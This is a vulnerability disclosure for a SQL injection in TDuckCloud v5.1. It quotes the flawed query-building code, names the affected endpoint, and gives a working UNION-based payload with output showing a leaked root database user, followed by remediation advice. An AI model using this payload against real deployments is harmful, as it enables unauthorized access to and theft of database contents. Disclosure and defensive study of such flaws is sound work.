# CVE-2025-57631 Vulnerability Report

## Vulnerability Information

- **CVE ID**: CVE-2025-57631
- **CWE ID**: CWE-89 (SQL Injection)
- **Affected Product**: TDuckCloud v5.1
- **Severity**: High

## Description

SQL Injection vulnerability in TDuckCloud v.5.1 allows a remote attacker to execute arbitrary code via the Add a file upload module.

## Vulnerable Code Location

**File**: `tduck-form/src/main/java/com/tduck/cloud/form/service/data/FormDataMysqlService.java`

**Method**: `searchAll()`

```java
@Override
public List<Map> searchAll(QueryFormResultRequest request) {
    List<UserFormDataEntity> userFormDataEntities = userFormDataMapper.selectRowsBySql(
        "select * from fm_user_form_data where form_key = '" + request.getFormKey() + "'"
    );
    return expandData(userFormDataEntities, null);
}
```

The `formKey` parameter is directly concatenated into the SQL query string without proper sanitization, allowing SQL injection attacks.

## Attack Vector

**Endpoint**: `POST /user/form/data/download/file`

**Parameters**: 
- `formKey`: Vulnerable parameter that allows SQL injection

## Proof of Concept

1. Login to TDuckCloud as authenticated user
2. Create a form with file upload component
3. Send malicious request with SQL injection payload:

```json
{
    "formKey": "validKey' UNION SELECT 1,database(),user(),version(),5,6,7,8,9,10,11,12,13,NOW(),15,NOW(),17-- -"
}
```

## Exploitation Result

The SQL injection successfully extracts database information:

```
[+] SQL Injection CONFIRMED!
[+] Leaked database user: root@172.20.0.3
```

## Impact

- Database information disclosure
- Unauthorized data access
- Potential for remote code execution through SQL injection
- Complete database compromise

## Remediation

1. Use parameterized queries or prepared statements
2. Implement proper input validation and sanitization
3. Apply least privilege principle for database accounts
4. Use ORM frameworks properly with parameter binding

## Timeline

- **Discovery Date**: 2026-02-04
- **Vendor Notification**: N/A
- **Public Disclosure**: N/A

## References

- TDuckCloud GitHub: https://github.com/TDuckCloud/tduck-platform
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
